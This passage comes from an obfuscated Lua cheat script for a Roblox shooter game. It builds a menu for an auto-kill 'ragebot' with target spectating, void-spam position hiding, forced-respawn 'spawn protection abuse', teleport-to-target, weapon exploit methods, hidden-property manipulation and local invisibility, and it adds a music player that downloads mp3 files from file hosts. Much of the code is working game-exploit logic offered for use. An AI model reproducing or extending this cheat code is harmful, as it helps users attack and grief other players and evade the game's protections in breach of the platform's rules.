        end
    else
        _G.zxcv92k1s.Visible = false
        _G.asdf81l0p.Visible = false
        _G.qwer73m1n.Visible = false
    end
end)
_G.xcmvi84k2.RenderStepped:Connect(_G.dsgusnrmhgursg)
section_misc:toggle({
    name = "client circle visualizer",
    flag = "cmdexe",
    default = false,
    callback = function(Value)
    end
})
section_misc:colorpicker({
    flag = "cmdixi",
    color = Color3.new(1, 0.4, 0.7),
    callback = function(color)
        _G.zxcv92k1s.Color = color
    end
})
section_misc:colorpicker({
    flag = "cmdixee",
    color = Color3.new(0, 0, 0),
    callback = function(color)
        _G.asdf81l0p.Color = color
        _G.qwer73m1n.Color = color
    end
})
section_misc:slider({
    name = "circle size",
    flag = "cmdixe",
    default = 10,
    min = 1,
    suffix = "px",
    max = 100,
    interval = 0.001,
    callback = function(Value)
        _G.zxcv92k1s.Radius = Value
        _G.asdf81l0p.Radius = Value + 1
        _G.qwer73m1n.Radius = Value - 1
    end
})
_G.ifdjgudhguyerhghedfgn = Drawing.new("Line")
_G.ifdjgudhguyerhghedfgn.Thickness = 3
_G.ifdjgudhguyerhghedfgn.Color = Color3.new(0, 0, 0)
_G.ifdjgudhguyerhghedfgn.Visible = false
_G.fghjksdhfgjkhsdfgjk = Drawing.new("Line")
_G.fghjksdhfgjkhsdfgjk.Thickness = 1
_G.fghjksdhfgjkhsdfgjk.Color = Color3.new(1, 1, 1)
_G.fghjksdhfgjkhsdfgjk.Visible = false
local TracerEnabled = false
section_misc:toggle({
    name = "client tracer visualizer",
    flag = "dfjisnijnijvdsdjdfvjddvddddddd",
    default = false,
    callback = function(Value)
        TracerEnabled = Value
        if not Value then
            _G.ifdjgudhguyerhghedfgn.Visible = false
            _G.fghjksdhfgjkhsdfgjk.Visible = false
        end
    end
})
section_misc:colorpicker({
    flag = "cmdixeegggeer",
    color = Color3.new(1, 1, 1),
    callback = function(color)
        _G.fghjksdhfgjkhsdfgjk.Color = color
    end
})
RunService.RenderStepped:Connect(LPH_NO_VIRTUALIZE(function()
    if not TracerEnabled then 
        _G.ifdjgudhguyerhghedfgn.Visible = false
        _G.fghjksdhfgjkhsdfgjk.Visible = false
        return 
    end
    local f = LocalPlayer.Character
    local g = f and f:FindFirstChild("HumanoidRootPart")
    if g then
        local h, i = Camera:WorldToViewportPoint(g.Position)
        local j = UserInputService:GetMouseLocation()
        if i then
            _G.ifdjgudhguyerhghedfgn.From = j
            _G.ifdjgudhguyerhghedfgn.To = Vector2.new(h.X, h.Y)
            _G.fghjksdhfgjkhsdfgjk.From = j
            _G.fghjksdhfgjkhsdfgjk.To = Vector2.new(h.X, h.Y)
            _G.ifdjgudhguyerhghedfgn.Visible = true
            _G.fghjksdhfgjkhsdfgjk.Visible = true
        else
            _G.ifdjgudhguyerhghedfgn.Visible = false
            _G.fghjksdhfgjkhsdfgjk.Visible = false
        end
    else
        _G.ifdjgudhguyerhghedfgn.Visible = false
        _G.fghjksdhfgjkhsdfgjk.Visible = false
    end
end))
section_artificial:toggle({
    name = "enabled",
    flag = "art_enabled_toggle",
    default = false,
    callback = function(Value)
        getgenv().ArtEnabled = Value
    end
})

section_artificial:slider({
    name = "refresh time",
    flag = "art_refresh_time",
    min = 1,
    suffix = "s",
    max = 10,
    default = 3,
    interval = 0.1,
    callback = function(Value)
        getgenv().ArtRefreshTime = Value
    end
})

section_artificial:slider({
    name = "forgiveness",
    flag = "art_forgiveness",
    min = 5,
    suffix = "x",
    max = 20,
    default = 14.4,
    interval = 0.01,
    callback = function(Value)
        getgenv().ArtForgiveness = Value
    end
})

section_artificial:slider({
    name = "position log limit",
    flag = "art_poslog",
    min = 5,
    suffix = "x",
    max = 800,
    default = 500,
    interval = 1,
    callback = function(Value)
        getgenv().ArtLogLimit = Value
    end
})

section_artificial:slider({
    name = "min verify hits",
    flag = "art_matchessss",
    min = 1,
    suffix = "x",
    max = 10,
    default = 4,
    interval = 1,
    callback = function(Value)
        getgenv().ArtMinMatches = Value
    end
})

section_artificial:slider({
    name = "out of void bonus",
    flag = "art_out_of_void_bonus",
    min = 0,
    suffix = "x",
    max = 20,
    default = 5,
    interval = 0.1,
    callback = function(Value)
        getgenv().ArtOutOfVoidBonus = Value
    end
})

section_artificial:slider({
    name = "distance based penalty",
    flag = "art_dist_penalty",
    min = 0,
    suffix = "x",
    max = 5,
    default = 3.1,
    interval = 0.1,
    callback = function(Value)
        getgenv().ArtDistPenalty = Value
    end
})
section_void:toggle({
    name = "enabled",
    flag = "uhjh65hkg",
    default = false,
    callback = function(Value)
        getgenv().ragevoidspm = Value
        flags["uhjh65hkg"] = Value
    end
})
section_void:dropdown({
    name = "pattern",
    flag = "s9dfoajobdhreywewdwedw",
    items = {'deep void','NaN point','default void'},
    default = 'deep void',
    callback = function(Value)
        flags["s9dfoajobdhreywewdwedw"] = Value
    end
})
section_void:dropdown({
    name = "direction",
    flag = "s9djjj22",
    items = {'+Y','+X','+Z'},
    default = '+Y',
    callback = function(Value)
        flags["s9djjj22"] = Value
    end
})
section_void:slider({
    name = "time in void",
    flag = "dfgfthj564wfv",
    default = 0.133,
    suffix = "sec",
    min = 0.01,
    max = 5,
    interval = 0.001,
    callback = function(Value)
        getgenv().voidspaminvoidragee = Value
    end
})
section_void:slider({
    name = "void positions switch speed",
    flag = "dfdgettdttrrrrttt6r",
    default = 0.02,
    suffix = "x",
    min = 0.01,
    max = 5,
    interval = 0.01,
    callback = function(Value)
        flags["dfdgettdttrrrrttt6r"] = Value
    end
})
section_void:slider({
    name = "depth multiply",
    flag = "dfdgettttfvrrrrttt6r",
    default = 13,
    min = 0,
    suffix = "x",
    max = 20,
    interval = 1,
    callback = function(Value)
        flags["dfdgettttfvrrrrttt6r"] = Value
    end
})
section_void:toggle({
    name = "smart cycle",
    flag = "ragebottemplehookunnamedenhancementsjujuascendifysample",
    default = false,
    callback = function(Value)
    end
})
section_void:slider({
    name = "pause void hide for",
    flag = "smart_wait_seconds",
    min = 1,
    max = 20,
    suffix = 'sec',
    default = 8,
    interval = 0.1,
    callback = function(Value)
    end
})
section_void:slider({
    name = "void hide for",
    flag = "smart_void_seconds",
    min = 1,
    max = 15,
    default = 5,
    suffix = 'sec',
    interval = 0.1,
    callback = function(Value)
    end
})
section_misc:toggle({
    name = "abuse spawn protection",
    flag = "sdjnfuewshjnfghj3eu7rgedj",
    default = false,
    callback = function(Value)
        _G.spawnProtectionAbuse = Value
        if Value then
            task.spawn(function()
                while _G.spawnProtectionAbuse do
                    if flags["auto_sentry"] then
                        local lp = game.Players.LocalPlayer
                        local char = lp.Character
                        if char and char:FindFirstChild("HumanoidRootPart") then
                            local hum = char:FindFirstChildWhichIsA("Humanoid")
                            if hum then hum:ChangeState(Enum.HumanoidStateType.Dead) end
                            char:ClearAllChildren()
                            local newgen = Instance.new("Model", workspace)
                            lp.Character = newgen
                            task.wait()
                            lp.Character = lp.Character
                            newgen:Destroy()
                        end
                    end
                    task.wait(5.4)
                end
            end)
        end
    end
})
_G.SpectateEnabled = true
_G.SpectateMode = "spectate while ragebot active"
if _G.SpectateConnection then 
    _G.SpectateConnection:Disconnect() 
end
_G.SpectateConnection = RunService.RenderStepped:Connect(LPH_NO_VIRTUALIZE(function()
    if not _G.SpectateEnabled then
        if LocalPlayer.Character then
            local myHum = LocalPlayer.Character:FindFirstChild("Humanoid")
            if myHum and Camera.CameraSubject ~= myHum then
                Camera.CameraSubject = myHum
            end
        end
        return
    end
    local isRagebotActive = nymus.Target.AutoKill
    local targetName = nymus.Target.Target
    local targetPlayer = targetName and Players:FindFirstChild(targetName)
    local shouldSpectate = false
    if _G.SpectateMode == "always spectate" then
        shouldSpectate = true
    elseif _G.SpectateMode == "spectate while ragebot active" and isRagebotActive then
        shouldSpectate = true
    end
    if shouldSpectate and targetPlayer and targetPlayer.Character then
        local targetHum = targetPlayer.Character:FindFirstChild("Humanoid")
        if targetHum then
            if Camera.CameraSubject ~= targetHum then
                Camera.CameraSubject = targetHum
            end
        end
    else
        if LocalPlayer.Character then
            local myHum = LocalPlayer.Character:FindFirstChild("Humanoid")
            if myHum and Camera.CameraSubject ~= myHum then
                Camera.CameraSubject = myHum
            end
        end
    end
end))
section_target:dropdown({
    name = "guns to use",
    flag = "gunsmulti",
    items = {'[AUG]','[Rifle]','[Flintlock]','[LMG]','[AK47]'},
    multi = true,
    callback = function(selectedTable)
        reupdallowedtools()
    end
})
section_target:slider({
    name = "spare ammo to buy",
    flag = "spare_ammo_count",
    default = 1,
    min = 0,
    suffix = "pcs",
    max = 7,
    interval = 1,
    callback = function(value)
        _G.Multi_SpareAmmo = value
    end
})
section_misc:button({
    name = "teleport",
    callback = function()
        if currentTarget and game.Players:FindFirstChild(currentTarget) then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[currentTarget].Character.HumanoidRootPart.CFrame
        end
    end
})
local function multigunoncharacteradded(newmultichar)
    character = newmultichar
    task.spawn(function()
        player:WaitForChild("Backpack", 10)
        local bodyEffects = newmultichar:WaitForChild("BodyEffects", 10)
        local fullyLoaded = bodyEffects:WaitForChild("FULLY_LOADED_CHAR", 10)
        if fullyLoaded then
            fullyLoaded.Value = true
        end
        if ismultion then
            reupdallowedtools()
            task.wait(0.2)
            checkAndBuyMissingTools()
            tooltrackingmulti()
            multigunbackpackmonitor()
            task.wait(0.1)
            equipallowedmultitools()
        end
    end)
end
player.CharacterAdded:Connect(multigunoncharacteradded)
if player.Character then task.spawn(multigunoncharacteradded, player.Character) end
task.spawn(function()
    while true do
        if ismultion and not _G.Multi_IsBuying then
            local bp = player:FindFirstChild("Backpack")
            local char = player.Character
            if bp and char then
                local tools = bp:GetChildren()
                for i = 1, #tools do
                    local tool = tools[i]
                    if tool:IsA("Tool") and multitoolsallowed[tool.Name] then
                        tool.Parent = char
                    end
                end
            end
        end
        task.wait(0.3)
    end
end)
local _G_dfg89hg = function(v_99f)
    local p = game.Players.LocalPlayer
    local b = p:FindFirstChild("Backpack")
    local c = p.Character
    local h = (b and b:FindFirstChild(v_99f)) or (c and c:FindFirstChild(v_99f))
    if not h then
        local o = _G.GetCharacterRoot() and _G.GetCharacterRoot().CFrame
        _G.BuyItem(v_99f)
        task.wait(0.2)
        if o then _G.GetCharacterRoot().CFrame = o end
    end
end
section_flameee:toggle({
    name = "enabled",
    flag = "fgh845yhdg",
    default = false,
    callback = function(v_state)
        local m = library.flags["ghj45yhjg"]
        if v_state then
            getgenv().connectionresolvderfgdg = false
            _G.flamethrower_hack = false
            getgenv().beanbag_method = false
            if m == "knife method" then
                _G_dfg89hg("[Knife]")
                getgenv().connectionresolvderfgdg = true
                getgenv().hitpedictglueee = true
            elseif m == "flamethrower method" then
                _G_dfg89hg("[Flamethrower]")
                _G.flamethrower_hack = true
            elseif m == "bag method" then
                _G_dfg89hg("[BrownBag]")
                getgenv().beanbag_method = true
                getgenv().connectionresolvderfgdg = true
            end
        else
            getgenv().connectionresolvderfgdg = false
            getgenv().hitpedictglueee = false
            getgenv().beanbag_method = false
            _G.flamethrower_hack = false
            local hrp = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                pcall(function() sethiddenproperty(hrp, "PhysicsRepRootPart", nil) end)
            end
        end
    end
})
section_flameee:dropdown({
    name = "method",
    flag = "ghj45yhjg",
    items = {"knife method","flamethrower method","bag method"},
    default = "knife method",
    multi = false,
    callback = function(v_mode)
        if library.flags["fgh845yhdg"] then
            _G.flamethrower_hack = false
            getgenv().connectionresolvderfgdg = false
            getgenv().beanbag_method = false
            if v_mode == "knife method" then
                _G_dfg89hg("[Knife]")
                getgenv().connectionresolvderfgdg = true
            elseif v_mode == "flamethrower method" then
                _G_dfg89hg("[Flamethrower]")
                _G.flamethrower_hack = true
            elseif v_mode == "bag method" then
                _G_dfg89hg("[BrownBag]")
                getgenv().beanbag_method = true
                getgenv().connectionresolvderfgdg = true
            end
        end
    end
})
section_flameee:slider({
    name = "height offset (flamethrower)",
    flag = "dfgh67hfgh",
    default = 8,
    min = 3,
    suffix = "x",
    max = 15,
    interval = 0.001,
    callback = function(v_val)
        _G.flameOrbitHeight = v_val
    end
})
game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(newChar)
    _G.IsRespawning = true
    local wasRagebotEnabled = flags and flags["auto_sentry"] or false
    local storedTarget = nymus.Target.Target
    _G.StopInvis = true
    table.clear(equippedmulti)
    _G.HitPredictRunning = false
    _G.Multi_IsBuying = false
    voidTimer = 0
    isVoidElevated = false
    getgenv().ResolvedPosition = nil
    local char = game.Players.LocalPlayer.Character
    if char then
        for _, v in pairs(char:GetDescendants()) do
            if v:IsA("BasePart") or v:IsA("Decal") then 
                v.LocalTransparencyModifier = 0 
            end
        end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if hrp then
            pcall(function() sethiddenproperty(hrp, "PhysicsRepRootPart", nil) end)
            hrp.Velocity = Vector3.new(0,0,0)
            hrp.RotVelocity = Vector3.new(0,0,0)
        end
    end
    local bodyEffects = newChar:WaitForChild("BodyEffects", 10)
    if bodyEffects then
        local fullyLoaded = bodyEffects:FindFirstChild("FULLY_LOADED_CHAR")
        if fullyLoaded then
            fullyLoaded.Value = true
        end
    end
    if typeof(resetVelocity) == "function" then resetVelocity() end
    _G.CurrentBuyingItem = nil
    _G.Multi_IsBuying = false
    _G.IsBuying = false
    _G.busdhfnjsy7gjsy7d = false
    _G.IsRespawning = false
    if wasRagebotEnabled and storedTarget then
        nymus.Target.Target = storedTarget
        nymus.Target.AutoKill = true
        _G.StopInvis = false
        task.spawn(function()
            while newChar and newChar.Parent and nymus.Target.AutoKill and not _G.StopInvis do
                for _, v in pairs(newChar:GetDescendants()) do
                    if v:IsA("BasePart") or v:IsA("Decal") then 
                        v.LocalTransparencyModifier = 1 
                    end
                end
                game:GetService("RunService").RenderStepped:Wait()
            end
        end)
    end
    task.spawn(function()
        local backpack = game.Players.LocalPlayer:WaitForChild("Backpack", 10)
        if not backpack then return end
        task.wait(0.1)
        if typeof(reupdallowedtools) == "function" then reupdallowedtools() end
        if typeof(tooltrackingmulti) == "function" then tooltrackingmulti() end
        if typeof(multigunbackpackmonitor) == "function" then multigunbackpackmonitor() end
        if nymus.Target.AutoKill then
            library:notification({text = "reloading all guns please wait"})
        end
        task.wait(0.2)
        if flags and flags["auto_sentry"] and typeof(checkAndBuyMissingTools) == "function" then
            checkAndBuyMissingTools()
        end
        task.wait(0.2)
        if ismultion then
            equipallowedmultitools()
            task.wait(0.1)
            for _, t in ipairs(equippedmulti) do
                if t and t.Parent == newChar then
                    MainEvent:FireServer("Reload", t)
                end
            end
        end
    end)
end)
_G.SoundService = game:GetService("SoundService")
_G.HttpService = game:GetService("HttpService")
_G.folderPath = "sample-songs"
if not isfolder(_G.folderPath) then
    makefolder(_G.folderPath)
end
_G.songs = {
    {name = "Tame Impala - One More Hour", file = "One More Hour.mp3", url = "https://pomf2.lain.la/f/s8k21saj.mp3"},
    {name = "Trippie Redd - Wish", file = "Wishtrp.mp3", url = "https://pomf2.lain.la/f/ytgag6nr.mp3"},
    {name = "Kate Bush - Running Up That Hill", file = "maxfromstrangerthingssongah.mp3", url = "https://cdn.getsample.lol/4n3jkiqw"},
    {name = "Xxx & Trippie - Fuck Love", file = "Fuhlve.mp3", url = "https://pomf2.lain.la/f/v1v8je0j.mp3"},
    {name = "Chris Grey - LET THE WORLD BURN", file = "tiktokahedit.mp3", url = "https://cdn.getsample.lol/lsgkdiry"},
    {name = "Djo - End of Beggining", file = "stevefromstrangerthings.mp3", url = "https://cdn.getsample.lol/64swey4v"},
    {name = "Miss Me", file = "MissMe.mp3", url = "https://github.com/NewbieScripter-web/mp3/raw/refs/heads/main/MissMe.mp3"},
    {name = "Lil Peep - Nuts", file = "Nuts.mp3", url = "https://pomf2.lain.la/f/3rp08d8.mp3"},
    {name = "Somewhere Only We Know", file = "Somewhere.mp3", url = "https://pomf2.lain.la/f/v4kygzal.mp3"},
    {name = "Headlock x Headlock", file = "Headlock.mp3", url = "https://pomf2.lain.la/f/uwr5n4vz.mp3"},
    {name = "King Von - Anti Piracy", file = "AntiPiracyKing.mp3", url = "https://pomf2.lain.la/f/5xltbwdx.mp3"},
    {name = "xaviersobased - in the yo", file = "in_the_yo.mp3", url = "https://pomf2.lain.la/f/dfdqazh.mp3"},
    {name = "Ken Carson - margiela", file = "margiela.mp3", url = "https://pomf2.lain.la/f/e2zpwgt3.mp3"},
    {name = "Ken Carson - ss", file = "ss.mp3", url = "https://pomf2.lain.la/f/s3jb1j5g.mp3"},
    {name = "Scars", file = "scrs.mp3", url = "https://cdn.getsample.lol/3f4mufoc"},
    {name = "Ken Carson - Fighting My Demons", file = "Fighting_My_Demons.mp3", url = "https://pomf2.lain.la/f/zwhwa8z2.mp3"},
    {name = "Playboi Carti - EVIL J0RDAN", file = "EVIL_J0RDAN.mp3", url = "https://pomf2.lain.la/f/yg82v42f.mp3"},
    {name = "Playboi Carti - Timeless", file = "Timeless.mp3", url = "https://pomf2.lain.la/f/dd43lkk3.mp3"},
    {name = "Skepta - That's Not Me", file = "Thats_Not_Me.mp3", url = "https://pomf2.lain.la/f/t8qdrudt.mp3"},
}
_G.currentSound = nil
_G.currentSongIndex = 1
_G.isPlaying = false
_G.musicVolume = 5
_G.getFilePath = function(song)
    return _G.folderPath .. "/" .. song.file
end
_G.downloadSong = function(song)
    local path = _G.getFilePath(song)
    if isfile(path) then
        return path
    end
    local success, data = pcall(function()
        return game:HttpGet(song.url, true)
    end)
    if success and data and #data > 10000 then
        writefile(path, data)
        return path
    end
    return nil
end
_G.preloadAllSongs = function()
    for _, song in ipairs(_G.songs) do
        task.spawn(function()
            _G.downloadSong(song)
        end)
    end
end
_G.playCurrentSong = function()
    if #_G.songs == 0 then
        library:notification({ text = "no songs available" })
        return
    end
    local song = _G.songs[_G.currentSongIndex]
    if _G.currentSound then
        _G.currentSound:Stop()
        _G.currentSound:Destroy()
        _G.currentSound = nil
    end
    local path = _G.downloadSong(song)
    if not path then
        library:notification({ text = "fail (download issue)" })
        return
    end
    local assetId
    local synSuccess, synAsset = pcall(function() return getsynasset(path) end)
    if synSuccess and synAsset then
        assetId = synAsset
    else
        local custSuccess, custAsset = pcall(function() return getcustomasset(path) end)
        if custSuccess and custAsset then
            assetId = custAsset
        end
    end
    if not assetId then
        library:notification({ text = "failed to load asset (executor issue)" })
        return
    end
    _G.currentSound = Instance.new("Sound")
    _G.currentSound.Name = "MusicPlayer"
    _G.currentSound.SoundId = assetId
    _G.currentSound.Volume = _G.musicVolume / 10
    _G.currentSound.Looped = false
    _G.currentSound.Parent = _G.SoundService
    _G.currentSound.Ended:Connect(function()
        _G.isPlaying = false
        _G.currentSongIndex = _G.currentSongIndex + 1
        if _G.currentSongIndex > #_G.songs then
            _G.currentSongIndex = 1
        end
        task.wait(1)
        _G.playCurrentSong()
    end)
    _G.currentSound:Play()
    _G.isPlaying = true
    library:notification({ text = "playing: " .. song.name })
end
_G.stopMusic = function()
    if _G.currentSound then
        _G.currentSound:Stop()
        _G.currentSound:Destroy()
        _G.currentSound = nil
    end
    _G.isPlaying = false
    library:notification({ text = "music stopped" })
end
_G.nextSong = function()
    _G.currentSongIndex = _G.currentSongIndex + 1
    if _G.currentSongIndex > #_G.songs then
        _G.currentSongIndex = 1
    end
    if _G.isPlaying then
        _G.playCurrentSong()
    end
end
_G.songNames = {}
for _, song in ipairs(_G.songs) do
    table.insert(_G.songNames, song.name)
end
do
	local configs = window:tab({ name = "settings" })
	local config = configs:section({ name = "settings", side = "right" })
	config:toggle({
		name = "keybind list",
		flag = "keybind_list",
		default = false,
		callback = function(bool)
			window.toggle_list(bool)
		end,
	})
    	config:toggle({
		name = "ignore ts toggle",
		flag = "player_list",
		default = false,
		callback = function(bool)
			window.toggle_playerlist(bool)
		end,
	})
	config:keybind({
		name = "ui keybind",
		default = Enum.KeyCode.RightControl,
		display = "menu keybind",
		callback = window.set_menu_visibility,
	})
	config:slider({
		name = "color picker animation speed",
		flag = "color_picker_anim_speed",
		min = 0,
		max = 5,
		default = 2,
		interval = 0.01,
		suffix = "",
	})
	config:colorpicker({
        name = "ui accent",
		color = Color3.fromHex("#ff8000"),
		flag = "accent",
		callback = function(color)
			library:update_theme("accent", color)
		end,
	})
	config:button({
		name = "copy job id",
		callback = function()
			setclipboard(game.JobId)
		end,
	})
	config:button({
		name = "copy game id",
		callback = function()
			setclipboard(game.GameId)
		end,
	})
	config:button({
		name = "copy join script",
		callback = function()
			setclipboard(
				'game:GetService("TeleportService"):TeleportToPlaceInstance('
					.. game.PlaceId
					.. ', "'
					.. game.JobId
					.. '", game.Players.LocalPlayer)'
			)
		end,
	})
config:dropdown({
    name = "select song",
    flag = "mp3_songselect",
    items = _G.songNames,
    multi = false,
    callback = function(value)
        for i, song in ipairs(_G.songs) do
            if song.name == value then
                _G.currentSongIndex = i
                break
            end
        end
    end
})
config:slider({
    name = "song volume",
    flag = "mp3_volume",
    default = 5,
    min = 0,
    max = 10,
    interval = 0.1,
    callback = function(value)
        _G.musicVolume = value
        if _G.currentSound then
            _G.currentSound.Volume = value / 10
        end
    end
})
config:button({
    name = "play",
    callback = function()
        _G.playCurrentSong()
    end
})

config:button({
    name = "stop",
    callback = function()
        _G.stopMusic()
    end
})
config:button({
    name = "next song",
    callback = function()
        _G.nextSong()
    end
})
task.spawn(_G.preloadAllSongs)
	local configs_section = configs:section({ name = "configs", side = "left" })
	local dir = library.directory .. "/configs/"
	library.config_holder = configs_section:dropdown({ name = "configs", items = {}, flag = "config_name_list" })
	configs_section:textbox({ flag = "config_name_text_box" })
	configs_section:button({
		name = "create config",
		callback = function()
			writefile(dir .. flags["config_name_text_box"] .. ".cfg", library:get_config())
			library:config_list_update()
            library:notification({text = "config succesfully created", duration = 3})
		end,
	})
	configs_section:button({
		name = "delete config",
		callback = function()
			library:panel({
				name = "are you sure you want to delete " .. flags["config_name_list"] .. " ?",
				options = { "Yes", "No" },
				callback = function(option)
					print(option)
					if option == "Yes" then
						delfile(dir .. flags["config_name_list"] .. ".cfg")
						library:config_list_update()
                        library:notification({text = "config deleted", duration = 3})
					end
				end,
			})
		end,
	})
	configs_section:button({
		name = "load config",
		callback = function()
			library:load_config(readfile(dir .. flags["config_name_list"] .. ".cfg"))
            library:notification({text = "config loaded succesfully", duration = 3})
		end,
	})
	configs_section:button({
		name = "save config",
		callback = function()
			writefile(dir .. flags["config_name_text_box"] .. ".cfg", library:get_config())
			library:config_list_update()
            library:notification({text = "config succesfully saved", duration = 3})
		end,
	})
    	configs_section:button({
		name = "refresh config list",
		callback = function()
			library:config_list_update()
            library:notification({text = "config list refreshed", duration = 3})
		end,
	})
	library:config_list_update()
end
Main.open_tab()
